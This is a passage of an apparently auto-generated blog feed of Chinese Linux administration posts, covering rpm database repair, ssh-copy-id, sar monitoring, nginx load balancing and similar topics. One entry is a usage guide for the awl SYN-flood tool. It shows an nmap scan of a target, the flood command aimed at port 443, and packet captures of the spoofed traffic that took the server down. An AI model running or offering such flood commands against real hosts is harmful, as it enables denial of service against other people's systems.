            <tag> ssh登录很慢的问题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>yum 错误 TypeError: rpmdb open failed</title>
      <link href="/2010/11/11/yum-error-typeerror-rpmdb-open-failed/"/>
      <url>/2010/11/11/yum-error-typeerror-rpmdb-open-failed/</url>
      <content type="html"><![CDATA[<p>无法用yum安装，错误如下<br>TypeError: rpmdb open failed<br>解决办法<br>是因为RPM数据库出现损坏导致的，它导致所有的软件的升级、安装甚至是删除都会出现问题，终端出现乱码，YUMEX也用不成，RPM命令也用不成。原因是RPM数据库被破坏，解决方法如下：<br>\$ su            切换到root权限<br># cd /var/lib/rpm/<br># for i in `ls | grep ‘db.’`;do mv $i $i.bak;done<br># rpm –rebuilddb     重建该数据库<br># yum clean all</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重建rpmdb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssh-copy-id</title>
      <link href="/2010/11/10/ssh-copy-id/"/>
      <url>/2010/11/10/ssh-copy-id/</url>
      <content type="html"><![CDATA[<p>服务器时常需要配置无密码的登录方式，最一般的设置方式如下：  </p><p># ssh-keygen<br># cat ~/.ssh/id_rsa.pub | ssh user@server “cat - &gt;&gt; ~/.ssh/authorized_keys”  </p><p>其实这方法已经很简单了，不过我总记不清如何正确拼写authorized_keys这个文件名。  </p><p>还好Linux系统里缺省都包含一个名为ssh-copy-id的工具：  </p><p># type ssh-copy-id<br>ssh-copy-id is /usr/bin/ssh-copy-id  </p><p>你用cat或者more命令看一下就知道ssh-copy-id本身其实就是一个shell脚本，用法很简单：  </p><p># ssh-copy-id -i ~/.ssh/id_rsa.pub user@server  </p><p>再也不用记如何拼写authorized_keys这个文件名了，是不是很爽，可惜别高兴太早了，ssh-copy-id有一个很要命的问题，那就是缺省它仅仅支持SSH运行在22端口的情况，不过实际上出于安全的需要，我们往往都会更改服务器的SSH端口，比如说改成10022端口，这时候你运行ssh-copy-id就会报错了，直接修改ssh-copy-id脚本当然可以修正这个问题，但是那样显得太生硬了，实际上还有更好的办法：  </p><p># vi ~/.ssh/config  </p><p>加上内容：  </p><p>Host server<br>Hostname ip<br>Port 10022  </p><p>你也可以单独只加入Port一行配置，那样就是一个全局配置，保存后再运行ssh-copy-id命令就不会报错了。  </p><p>补充：经网友提示，如果端口不是22，不修改config文件，按如下方式也可以：  </p><p>ssh-copy-id -i ~/.ssh/id_rsa.pub “-p 10022 user@server”</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关于shell“ambiguous redirect”</title>
      <link href="/2010/11/09/about-the-shell-ambiguous-redirect/"/>
      <url>/2010/11/09/about-the-shell-ambiguous-redirect/</url>
      <content type="html"><![CDATA[<p>head -50000 $dir/$file &gt;access_$creatime<br>date +%m%d-%k%M，由于使用了date的 %k 格式，而且没有使用双引号，凌晨开始，在重定向到以日期为文件名的文件时，出现了错误“ambiguous redirect”<br>因为%K的格式生成的日志格式名类似于 access_0526- 146<br>改成使用%H参数，或者将文件名用双引号括起来即可。<br>说明：<br>The redirect error normally occurs when a wildcard is used or spaces exist in the filename and it hasn’t been surrounded by quotes.</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ambiguous </tag>
            
            <tag> redirect </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux中通过script命令那个记录屏幕的输出</title>
      <link href="/2010/11/08/in-linux-the-output-of-that-record-screen-is-ordered-by-script/"/>
      <url>/2010/11/08/in-linux-the-output-of-that-record-screen-is-ordered-by-script/</url>
      <content type="html"><![CDATA[<p>我们用script来记录屏幕的输出，这个是在Linux的平台下使用的，Solaris和AIX中script命令没有-f选项。</p><pre><code>-f选项的意思就是只有当缓冲区满后才能在另外一个终端显示前一次缓冲区满的内容。即使是异常退出也没有问题，仍然可以正常记录log，用命令script -f screen.log就可以了。如果在第一个终端上使用mkfifo screen.log(一般不用这个命令)和命令script -f screen.log。在另外一个终端找到这个screen.log文件，用tail -f screen.log就会实时滚动输出你在第一个终端的输出。如果没有-f就是只有当缓冲区满了后才能在另外一个终端显示前一次缓冲区满的内容。第一个窗口：[root@localhost ~]# script -f screen.log  Script started, file is screen.log  [root@localhost ~]# ls -ltr  total 33548  -rw-r--r-- 1 root root 15981 Jan 10 2008 server.met0  -rw-r--r-- 1 root root 9347 Mar 17 2008 install.log.syslog  -rw-r--r-- 1 root root 53792 Mar 17 2008 install.log  drwxr-xr-x 2 root root 4096 Jun 5 20:17 result  drwxr-xr-x 2 root root 4096 Jun 6 20:12 little  drwxr-xr-x 2 root root 4096 Jun 6 22:35 2little  drwxr-xr-x 2 root root 4096 Jun 6 23:04 big  -rw-r--r-- 1 root root 1079120 Jun 18 15:25 test.cap  drwxr-xr-x 5 root root 4096 Jun 30 12:43 Final  -rw-r--r-- 1 root root 805 Jul 2 20:15 Parser.h  -rw-r--r-- 1 root root 855 Jul 2 20:29 HttpDownloader.h  -rw-r--r-- 1 root root 2997 Jul 3 08:37 Parser.cpp  -rw-r--r-- 1 root root 2770 Jul 3 08:39 HttpDownloader.cpp  -rw-r--r-- 1 root root 32 Jul 28 16:21 HarmKeyWord.ini  -rw-r--r-- 1 root root 822 Jul 29 15:35 queue.cap  -rw-r--r-- 1 root root 3112 Oct 13 20:44 manscript  -rw-r--r-- 1 root root 79 Oct 13 20:47 screen.log  [root@localhost ~]# sdf  bash: sdf: command not found  [root@localhost ~]#  [root@localhost ~]# w  20:48:14 up 5 days, 4:29, 3 users, load average: 6.15, 2.60, 1.49  USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT  root pts/1 172.16.15.111 19:36 54:33 0.05s 0.05s -bash  root pts/3 172.16.13.134 20:44 35.00s 0.03s 0.00s tail -f screen.  root pts/5 172.16.13.134 20:28 0.00s 0.02s 0.00s script -f scree  [root@localhost ~]# exit  exitScript done on Mon 13 Oct 2008 08:48:23 PM CST[root@localhost ~]#第二个窗口：[root@localhost ~]# tail -f screen.log  Script started on Mon 13 Oct 2008 08:47:29 PM CST  [root@localhost ~]# ls -ltr  total 33548  -rw-r--r-- 1 root root 15981 Jan 10 2008 server.met0  -rw-r--r-- 1 root root 9347 Mar 17 2008 install.log.syslog  -rw-r--r-- 1 root root 53792 Mar 17 2008 install.log  drwxr-xr-x 2 root root 4096 Jun 5 20:17 result  drwxr-xr-x 2 root root 4096 Jun 6 20:12 little  drwxr-xr-x 2 root root 4096 Jun 6 22:35 2little  drwxr-xr-x 2 root root 4096 Jun 6 23:04 big  -rw-r--r-- 1 root root 1079120 Jun 18 15:25 test.cap  drwxr-xr-x 5 root root 4096 Jun 30 12:43 Final  -rw-r--r-- 1 root root 805 Jul 2 20:15 Parser.h  -rw-r--r-- 1 root root 855 Jul 2 20:29 HttpDownloader.h  -rw-r--r-- 1 root root 2997 Jul 3 08:37 Parser.cpp  -rw-r--r-- 1 root root 2770 Jul 3 08:39 HttpDownloader.cpp  -rw-r--r-- 1 root root 32 Jul 28 16:21 HarmKeyWord.ini  -rw-r--r-- 1 root root 822 Jul 29 15:35 queue.cap  -rw-r--r-- 1 root root 3112 Oct 13 20:44 manscript  -rw-r--r-- 1 root root 79 Oct 13 20:47 screen.log  [root@localhost ~]# sdf  bash: sdf: command not found  [root@localhost ~]#  [root@localhost ~]# w  20:48:14 up 5 days, 4:29, 3 users, load average: 6.15, 2.60, 1.49  USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT  root pts/1 172.16.15.111 19:36 54:33 0.05s 0.05s -bash  root pts/3 172.16.13.134 20:44 35.00s 0.03s 0.00s tail -f screen.  root pts/5 172.16.13.134 20:28 0.00s 0.02s 0.00s script -f scree  [root@localhost ~]# exit  exitScript done on Mon 13 Oct 2008 08:48:23 PM CST[root@localhost ~]#通过这个方式，也可以用于教学当中，老师通过script命令记录操作日志，学员通过tail -f命令实时查看老师讲解情况。</code></pre>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>awl 多线程SYN攻击工具0.2版</title>
      <link href="/2010/11/08/awl-multi-threaded-syn-attack-tool-0-2/"/>
      <url>/2010/11/08/awl-multi-threaded-syn-attack-tool-0-2/</url>
      <content type="html"><![CDATA[<p>一,安装:<br>tar -zxvf awl-0.2.tar.gz<br>./configure<br>make<br>make install<br>awl的执行程序安装后在/usr/local/bin/目录下<br>二,说明:<br>awl 的格式如下:<br>./awl -i eth0 -m aa:bb:cc:dd:ee:ff -d ip -p port<br>参数如下:<br>-i 发送包的接口,如果省略默认是eth0<br>-m 被攻击机器的mac地址,程序不能根据被攻击IP得到MAC,需要手工指定.先ping 目标IP,再arp -a就可以看到.如果省略则为ff:ff:ff:ff:ff:ff<br>-d 被攻击机器的IP<br>-p 被攻击机器的端口.<br>三,测试,<br>服务器端:centOS 5.0<br>对方服务器:freebsd  6.2  运行apache<br>1,首先得知对方IP<br>运行nmap -v -A 192.168.0.1  查看对方开了啥服务<br>[root@localhost bin]# nmap -v -A 10.122.89.106<br>Starting Nmap 4.11 ( <a href="http://www.insecure.org/nmap/" target="_blank" rel="noopener">http://www.insecure.org/nmap/</a> ) at 2008-06-02 19:24 CST<br>DNS resolution of 1 IPs took 0.39s.<br>Initiating SYN Stealth Scan against 10.122.89.106 [1680 ports] at 19:24<br>Discovered open port 21/tcp on 10.122.89.106<br>Discovered open port 25/tcp on 10.122.89.106<br>Discovered open port 22/tcp on 10.122.89.106<br>Discovered open port 443/tcp on 10.122.89.106<br>Discovered open port 80/tcp on 10.122.89.106<br>Discovered open port 199/tcp on 10.122.89.106<br>Discovered open port 110/tcp on 10.122.89.106<br>Discovered open port 143/tcp on 10.122.89.106<br>Discovered open port 3306/tcp on 10.122.89.106<br>得知对方开了如上端口<br>ping 192.168.0.1  得知mac地址<br>查看arp -a 得知对方IP的MAC地址<br>2.开始攻击:<br>./awl -i eth0 -m aa:bb:cc:dd:ee:ff -d 192.168.0.1 -p 443<br>ping 192.168.0.1 -t 查下对方反应<br>四,测试效果<br>攻击一开始,对方明显挂掉,各种应用无反应,<br>如下是抓包:<br>[root@localhost ~]# tcpdump<br>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode<br>listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes<br>19:26:10.765001 IP 196.224.129.69.58334 &gt; 10.122.82.169.https: S 2137366997:2137366997(0) win 57403<br>19:26:13.835951 IP 221.140.165.45.45259 &gt; 10.122.82.169.https: S 2020705765:2020705765(0) win 28443<br>19:26:14.379435 IP 108.99.168.18.63871 &gt; 10.122.82.169.https: S 1625298749:1625298749(0) win 23981<br>19:26:14.917676 IP 141.90.214.98.34527 &gt; 10.122.82.169.https: S 697113617:697113617(0) win 48400<br>19:26:15.645562 IP 111-104.dsl.sky.cz.33734 &gt; 10.122.82.169.https: S 1620903624:1620903624(0) win 34262<br>19:26:16.396435 IP 135.205.163.109.59589 &gt; 10.122.82.169.https: S 1747490631:1747490631(0) win 40348</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux UPD数据包大小限制</title>
      <link href="/2010/11/08/linux-upd-packet-size-limits/"/>
      <url>/2010/11/08/linux-upd-packet-size-limits/</url>
      <content type="html"><![CDATA[<p>今天拿起来了以前一个写的程序，因为要上线了，所以同事进行了一次压力测试，经过测试，部分发送的UPD数据包被抛弃了，只好埋头处理了。<br>　　基本程序是这样的，建立UPD服务器用来接收数据包，创建另一个线程处理数据，完成逻辑需求，刚开始我是用一个全局字符串保存数据的，每次只能接收到61个数据包，以后的全被抛弃了，起初以为是PYTHON的字符串导致的结果，所以又将字符串转换为列表，效果依然一样，因为PYTHON提供了QUEUE的模块，所以又将列表转换为队列处理，终于超过61个啦，这个兴奋啊，有句话说的好，事情往往不是那么简单的，查询了日志，发现中间莫名其妙的丢掉了N多数据包，发送的值越大，丢包越严重。<br>　　第二天经过G，<a href="http://www.29west.com/docs/THPM/udp-buffer-sizing.html" target="_blank" rel="noopener">找到了</a>，期间详细的说明了怎样检测UDP丢包和改变UDP缓存大小，所以检测了我的小LINUX上的设置情况 sysctl -a | grep net.core，数据显示是128K，经过适当放大以下两个参数<br>　　net.core.rmem_default<br>　　net.core.rmem_max<br>　　在经过测试，果然丢包的问题解决了。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>wget 重试次数和超时时间</title>
      <link href="/2010/11/08/wget-retry-times-and-timeouts/"/>
      <url>/2010/11/08/wget-retry-times-and-timeouts/</url>
      <content type="html"><![CDATA[<p>最近服务有问题，内存溢出，但服务的代码已经不在，无法让开发进行优化，前端进行了nginx负载，后端进行wget获取URL，失败时重启服务，但当服务出现问题时，发现重启没有自动重启，查看日志后发现wget一直进行重试操作，所以修改如下，</p><p>查看wget参数如下：</p><p>-t     设置重试次数。当连接中断（或超时）时，wget将试图重新连接。如果指<br>    定-t0，则重试次数设为无穷多。</p><p>-T,–timeout=SECONDS 设置超时时间</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用hal-device时的报错centos5.3</title>
      <link href="/2010/11/05/centos5-3-when-using-hal-device/"/>
      <url>/2010/11/05/centos5-3-when-using-hal-device/</url>
      <content type="html"><![CDATA[<p>[root@T61 dbus]# hal-device<br>error: dbus_bus_get: org.freedesktop.DBus.Error.NoServer: Failed to connect to socket /var/run/dbus/system_bus_socket: Connection refused</p><p>这是因为dbus服务没有启动，启动dbus服务/etc/init.d/messagebus</p><p>又报下面的错误</p><p>[root@T61 dbus]# hal-device<br>error: libhal_ctx_init: (null): (null)<br>hal-device.c 144 : INFO: called LIBHAL_FREE_DBUS_ERROR but dbusError was not set.</p><p>报这个错，居然是因为hal的服务haldaemon没有启动。</p><p>/etc/rc.d/init.d/haldaemon start 解决</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>tomcat关闭cookies</title>
      <link href="/2010/11/05/tomcat-to-shut-down-the-cookies/"/>
      <url>/2010/11/05/tomcat-to-shut-down-the-cookies/</url>
      <content type="html"><![CDATA[<p>在Tomcat context.xml 配置文件中 做如下设置 <context cookies="false"></context></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浅谈Nginx负载均衡的分配方式和设备状态</title>
      <link href="/2010/11/05/the-distribution-mode-and-equipment-state-of-nginx-load-balancing-are-discussed/"/>
      <url>/2010/11/05/the-distribution-mode-and-equipment-state-of-nginx-load-balancing-are-discussed/</url>
      <content type="html"><![CDATA[<p>Nginx作为高并发、高性能的HTTP服务器已经被大多开发者所使用，这里简单讲一下Nginx的负载均衡的分配方式和设备状态。</p><p>Nginx的upstream目前支持4种方式的分配</p><p>(1)轮询（默认）</p><p>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。</p><p>(2)weight</p><p>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</p><p>(3)ip_hash</p><p>每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。</p><p>(4)fair（第三方）</p><p>按后端服务器的响应时间来分配请求，响应时间短的优先分配。</p><p>(5)、url_hash（第三方）</p><p>每个设备的状态设置为：</p><p>1.down：表示单前的server暂时不参与负载。</p><p>2.weight：默认为1.weight越大，负载的权重就越大。</p><p>3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream 模块定义的错误。</p><p>4.fail_timeout：max_fails次失败后，暂停的时间。</p><p>5.backup：其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。</p><p>复制代码Nginx支持同时设置多组的负载均衡，用来给不用的server来使用。</p><p>实例：</p><p>upstream wapgate{  </p><p>#ip_hash;<br>server 192.168.169.43:11304    ;<br>server 192.168.164.37:11302   ;  </p><p>#hash $http_sky_real_ip;<br>hash_again 3;<br>}</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>sar 命令的参数</title>
      <link href="/2010/11/04/the-parameters-of-the-sar-command/"/>
      <url>/2010/11/04/the-parameters-of-the-sar-command/</url>
      <content type="html"><![CDATA[<p>根据Linux中的sar命令，总结了一下sar命令的常用参数</p><p>Sar相关环境：</p><p>S_TIME_FORMAT：If this variable exists and its value is ISO then the current locale will be ignored when printing the date in the report header. The sar command will use the ISO 8601 format (YYYY-MM- DD) instead.</p><p>Sar能工作，/proc目录必须被mount上来</p><p>CPU</p><p>-u</p><p>-P</p><p>内存</p><p>-r</p><p>-R</p><p>Block device情况</p><p>-d</p><p>I/O</p><p>-b</p><p>页交换情况</p><p>-B</p><p>进程</p><p>-c</p><p>网络</p><p>-n</p><p>机器负载</p><p>-q</p><p>Swap</p><p>-W</p><p>全部的信息</p><p>-A</p><p>CPU使用率 – 缺省</p><p>Report CPU utilization</p><p>-u</p><p>%user： Percentage of CPU utilization that occurred while exe cuting at the user level (application).</p><p>%nice：at the user level with nice priority</p><p>%system：at the system level (kernel).</p><p>%iowait：Percentage of time that the CPU or CPUs were idle during which the system had an outstanding disk I/O request</p><p>%idle： Percentage of time that the CPU or CPUs were idle and the system did not have an outstanding disk I/O request</p><p>CPU情况</p><p>-P cpu | ALL</p><p>统计单个或多个cpu的情况</p><p>ALL：再加上整体统计情况</p><p>-u 和–I SUM 2个参数跟着-P有意义。</p><p>内存使用率</p><p>Report memory and swap space utilization statistics</p><p>-r</p><p>所有的数量单位： kbytes</p><p>Kbmemfree、Kbmemused、%memused：</p><p>内存空闲、使用了，使用的%</p><p>Kbbuffers：内核当作buffer使用的内存</p><p>Kbcached:：内核当作cache data使用的内存</p><p>Kbswpfree、Kbswpused、%swpused</p><p>Swap使用的3个值</p><p>Kbswpcad：缓存的swap空间。这个意思是：内存被swap out,又立即swap back in,但是还存在swap中，（如果memory需要，memory不需要再次swap out了，它在swap已经存在，节省了I/O）</p><p>内存使用统计</p><p>Report memory statistics</p><p>-R</p><p>frmpg/s：系统释放的内存页数量，如果是负数表示被系统分配的数量。内存页时4k或8k和系统架构有关。</p><p>bufpg/s：系统用作buffer的增量内存页</p><p>campg/s：系统用作cache的增量内存页</p><p>I/O和传输统计</p><p>I/O and tranfer statistics</p><p>-b</p><p>只在Kernal2.5以前的版本中才有效</p><p>Tps：物理磁盘每秒总的传输量。多个逻辑的请求可能被合并成一个单独的磁盘请求。</p><p>Rtps：读的请求</p><p>Wtps：写的请求</p><p>Bread/s：每秒从磁盘读的块数</p><p>Wread/s：每秒写的块数</p><p>页的统计消息</p><p>Paging statistics</p><p>-B</p><p>Pgpgin/s: 每秒磁盘page in的数量（kbytes）</p><p>Pgpgout/s：每秒磁盘page out的量（kbytes）</p><p>Fault/s：系统每秒page faults（major+minor）的数量（2.5以上kernal）</p><p>majflt/s：系统每秒产生的major faults数量（2.5以上kernel）</p><p>进程</p><p>Process creation</p><p>-c</p><p>Proc/s：每秒产生的进程数量</p><p>Block device性能</p><p>-d</p><p>2.4或以上版本有</p><p>Devm-n: m:device的major number</p><p>n: device的 minor number(kernal 2.5)</p><p>tps:　设备的每秒传输量</p><p>rd_sec/s:设备的读的扇区数量（512k/sector）</p><p>wr_sec/s : 设备写的扇区数量（512k/sector）</p><p>采用文件</p><p>-f ： 从。。读</p><p>-o： 写入。。。</p><p>从文件中获取数据（由-o产生的文件）</p><p>缺省值是current daily data file（/var/log/sa/sadd）</p><p>-f排斥-o参数</p><p>改变间隔时间</p><p>-i interval</p><p>单位是秒</p><p>网络情况</p><p>-n</p><p>-n DEV | EDEV | SOCK | FULL</p><p>DEV参数：</p><p>Network devices 的统计信息被报告</p><p>IFACE：设备名字</p><p>rxpck/s：每秒收到的包（package）</p><p>txpck/s：每秒传输的包</p><p>rxbyt/s：每秒收到的字节</p><p>txbyt/s：每秒传输的字节</p><p>rxcmp/s：每秒收到的压缩包（如cslip..）</p><p>txcmp/s:</p><p>rxmcst/s: 每秒收到的广播包</p><p>EDEV：</p><p>错误的统计信息</p><p>rxerr/s， txerr/s</p><p>coll/s： 传输过程中遇到的冲突包</p><p>rxdrop/s， txdrop/s：由于缺少Linux缓存区，被丢弃的接收/传输包</p><p>txcarr/s： 传输包时候遇到的carrier-errors数量</p><p>rxfram/s：接收frame对列错误数量</p><p>rxfifo/s：接收FIFO overrun错误数量</p><p>txfifo/s：传输的FIFO overrun错误数量</p><p>SOCK：</p><p>使用中的socket统计</p><p>Totsck： 使用中的socket</p><p>Tcpsck： tcp socket</p><p>Udpsck：</p><p>Rawsck：</p><p>ip-frag： Number of IP fragments currently in use.</p><p>机器负载</p><p>Report queue length and load averages</p><p>-q</p><p>runq-sz：运行的队列长度（number of processes waiting for run time）</p><p>plist-sz： （Number of processes in the process list）</p><p>ldavg-1、ldavg-5、ldavg-15：</p><p>1、5、15分钟平均负载</p><p>文件</p><p>Report status of inode, file and other kernel tables</p><p>-v</p><p>Dentunusd：Number of unused cache entries in the directory cache<br>file-sz：Number of used file handles</p><p>inode-sz：Number of used file handles</p><p>super-sz、%super-sz： Number of super block handlers allocated by the kerne。(regard to the maximum number of super block handlers that Linux can allocate)</p><p>dquot-sz、%dquot-sz：Number of allocated disk quota entries (regard to the maximum number of cached disk quota entries that can be allocated)</p><p>rtsig-sz、%rtsig-sz：Number of queued RT signals.（regard to the maxi mum number of RT signals that can be queued）</p><p>Report system switching activity</p><p>-w</p><p>cswch/s：Total number of context switches per second.</p><p>Swap：</p><p>Report swapping statistics</p><p>-W</p><p>pswpin/s： Total number of swap pages the system brought in per second</p><p>pswpout/s：Total number of swap pages the system brought out per second</p><p>Process相关</p><p>-x</p><p>-X</p><p>改变格式</p><p>-h</p><p>-H</p><p>设定时间</p><p>-e hh:mm:ss：结束时间</p><p>-s 开始时间</p><p>设置报告的截止时间。缺省的截止时间是18:00:00, 给出的时间必须24小时制。</p><p>这个参数只有当数据从文件中读写时候才有效（-f / -o 参数）。</p><p>如果同时使用-h参数，给出的时间是UTC时间</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用SA和SAR进行系统监视</title>
      <link href="/2010/11/04/use-sa-and-sar-for-system-monitoring/"/>
      <url>/2010/11/04/use-sa-and-sar-for-system-monitoring/</url>
      <content type="html"><![CDATA[<p>首先需要安装一个包</p><h1 id="rpm-qa-sysstat"><a href="#rpm-qa-sysstat" class="headerlink" title="rpm -qa sysstat"></a>rpm -qa sysstat</h1><p>sysstat-7.0.2-3.el5</p><p>这个包安装了一些很有用的文件</p><h1 id="rpm-ql-sysstat"><a href="#rpm-ql-sysstat" class="headerlink" title="rpm -ql sysstat"></a>rpm -ql sysstat</h1><p>/etc/cron.d/sysstat</p><p>/etc/rc.d/init.d/sysstat</p><p>/etc/sysconfig/sysstat</p><p>/etc/sysconfig/sysstat.ioconf</p><p>/usr/bin/iostat</p><p>/usr/bin/mpstat</p><p>/usr/bin/sadf</p><p>/usr/bin/sar</p><p>/usr/lib/sa</p><p>/usr/lib/sa/sa1</p><p>/usr/lib/sa/sa2</p><p>/usr/lib/sa/sadc</p><p>……</p><p>/var/log/sa</p><p>要启动SAR，必须通过cron工具以周期性的间隔启动。</p><p>安装sysstat包后，默认创建一个/etc/cron.d/sysstat文件，其默认内容为：</p><h1 id="run-system-activity-accounting-tool-every-10-minutes"><a href="#run-system-activity-accounting-tool-every-10-minutes" class="headerlink" title="run system activity accounting tool every 10 minutes"></a>run system activity accounting tool every 10 minutes</h1><p><em>/10 </em> <em> </em> * root /usr/lib/sa/sa1 1 1</p><h1 id="generate-a-daily-summary-of-process-accounting-at-23-53"><a href="#generate-a-daily-summary-of-process-accounting-at-23-53" class="headerlink" title="generate a daily summary of process accounting at 23:53"></a>generate a daily summary of process accounting at 23:53</h1><p>53 23 <em> </em> * root /usr/lib/sa/sa2 -A</p><p>这里用到了两个命令</p><p>/usr/lib/sa/sa1</p><p>/usr/lib/sa/sa2</p><p>sa1：是调用sadc（二进制文件），将数据收集到二进制日志文件的一个Shell脚本。sa1命令还确保每天使用不同的文件。每隔十分钟运行一次该命令，最好不要改这个值，这是对一般系统折中的值。二进制日志文件存放在/var/log/sa/目录下，命名为sa${DATE}。</p><p>sa2：是将当日二进制日志文件中所有的数据转储到文本文件（sar）的另一个Shell脚本，然后它将清除七天之前的所有日志文件。参数-A指定了从二进制文件中提取哪些数据转储到文本文件中。转储的文件存放在/var/log/sa/目录下，命名为sar${DATE}。</p><p>这两个命令要配合着使用。</p><p>（强烈建议看一下这两个命令的脚本）</p><p>查看一下/usr/lib/sa/sa1脚本，里面执行这样一句命令：</p><p>/usr/lib/sa/sadc -F -L 1 1 -</p><p>-F：强制指定一个储存文件，如果文件已存在，就将其转换成sa的二进制文件形式。</p><p>-L：给sa文件加互斥锁，不能让两个sadc进程同时写一个sa文件。</p><p>跟据sa1脚本中的命令，我们也可以手动的创建sa二进制文件，使用/usr/lib/sa/sadc命令，</p><h1 id="usr-lib-sa-sadc-1-10-tmp-jaylin-sa"><a href="#usr-lib-sa-sadc-1-10-tmp-jaylin-sa" class="headerlink" title="/usr/lib/sa/sadc 1 10 /tmp/jaylin_sa"></a>/usr/lib/sa/sadc 1 10 /tmp/jaylin_sa</h1><p>上述命令的作用是：每隔1s写一条记录，写10条，存放到二进制文件/tmp/jaylin_sa中。</p><p>查看一下/usr/lib/sa/sa2脚本，里面执行这样一句命令：</p><p>/usr/bin/sar -A -f /var/log/sa/sa${DATE} &gt; /var/log/sa/sar${DATE}</p><p>-A：列出所有存储在/var/log/sa/sa${DATE}里的统计信息。</p><p>-f：指定将要转储的sa文件，默认的参数值为/var/log/sa/sa${DATE}。</p><p>根据sa2脚本中的命令，我们也可以手动将sa文件（二进制）转储到sar文件（ASCII文本）中，使用/usr/bin/sar命令，</p><h1 id="usr-bin-sar-A-f-tmp-jaylin-sa-gt-tmp-jaylin-sar"><a href="#usr-bin-sar-A-f-tmp-jaylin-sa-gt-tmp-jaylin-sar" class="headerlink" title="/usr/bin/sar -A -f /tmp/jaylin_sa&gt; /tmp/jaylin_sar"></a>/usr/bin/sar -A -f /tmp/jaylin_sa&gt; /tmp/jaylin_sar</h1><p>我们可以通过cat等命令查看sar文件的内容。但是我们也可以通过sar命令读取sa的二进制文件。</p><h1 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h1><p>03:00:01 PM     CPU     %user     %nice   %system   %iowait    %steal    %idle</p><p>03:10:01 PM       all      1.02      0.00      2.33      0.39      0.00     96.25</p><p>03:20:01 PM       all      1.85      0.00      3.29      0.32      0.00     94.54</p><p>03:30:02 PM       all      1.63      0.06      3.81      2.05      0.00     92.45</p><p>03:40:02 PM       all      9.31      0.00      8.10      3.39      0.00     79.20</p><p>03:50:01 PM       all      8.64      0.00      7.73      2.27      0.00     81.36</p><p>04:00:01 PM       all      0.84      0.00      2.12      1.81      0.00     95.23</p><p>Average:          all      3.88      0.01      4.56      1.71      0.00     89.84</p><p>其中：</p><p>%user：CPU花费在用户进程（如应用程序、Shell脚本或该用户进行的交互）上的时间的百分比。</p><p>%nice：CPU用来执行有用户级别优先级别的任务的时间的百分比。</p><p>%system：CPU用来执行核心任务的时间的百分比。</p><p>%iowait：CPU等待块设备输入或输出的时间的百分比。</p><p>%steal：CPU等待管理程序（hypervisor）处理其他任务的时间的百分比。</p><p>%idle：CPU未进行任何有用操作的时间的百分比。</p><p>最后一行是所有数据的平均值。然而，因为大多数系统都会在忙时间段后经历空闲时间段，所以平均值并不能反映完整的情况。</p><p>其他度量参数：</p><p>-b：显示了缓冲区信息和使用缓冲区与必须写磁盘的比率。</p><p>-c：显示了系统调用分解为一些常用的调用，如fork()、exec()、read()和write()。高进程 创建会导致较差的性能，并且这是可能需要将一些应用程序转移到其他计算机的信号。</p><p>-p 和 -w：显示了分页（交换）活动。高分页操作是内存缺乏的信号。特别地，-w 选项 显示了进程切换的次数：高的数值表示计算机上运行的内容过多，该计算机在切换任务 上花费了比实际工作更多的时间。</p><p>-q：显示了运行队列的大小，它与当时的平均负载相同。</p><p>-r：显示了一段时间的可用内存和交换空间。</p><p>它们显示每一列的含义请查看sar的man page。</p><p>我们也可以查看指定的某一时间段内的记录</p><p>-f：指定要读取的sa文件。</p><p>-s：开始的时间。注意，-s不是包含性的，所以必须从所选择的开始时间减去十分钟。</p><p>-e：结束的时间。</p><p>例如：</p><h1 id="sar-f-var-log-sa-sa12-s-14-50-00-e-15-30-00"><a href="#sar-f-var-log-sa-sa12-s-14-50-00-e-15-30-00" class="headerlink" title="# sar -f /var/log/sa/sa12 -s 14:50:00 -e 15:30:00"></a># sar -f /var/log/sa/sa12 -s 14:50:00 -e 15:30:00</h1><p>03:00:01 PM     CPU     %user     %nice   %system   %iowait    %steal     %idle</p><p>03:10:01 PM       all      1.02      0.00      2.33      0.39      0.00     96.25</p><p>03:20:01 PM       all      1.85      0.00      3.29      0.32      0.00     94.54</p><p>Average:          all      1.44      0.00      2.81      0.36      0.00     95.40</p><p>上述命令查看本月12日，15:00—15:30之间的记录。</p><p>下面介绍一个第三方工具Ksar</p><p>这个工具可以将sar文件装换成图形，便于查看内存等数据的变化情况。</p><p>将下载的kSar-5.0.6.zip解压，解压后生成的目录下，有一个run.sh脚本。给其增加可执行权限。执行脚本，会出现一个图形界面：</p><p>将存在的sar文件导入工具，就可以看到根据sar文件记录生成的图形。</p><p>注意，如果是手动将sa文件转储到sar文件中，执行sar命令时要加LANG=C，即：</p><h1 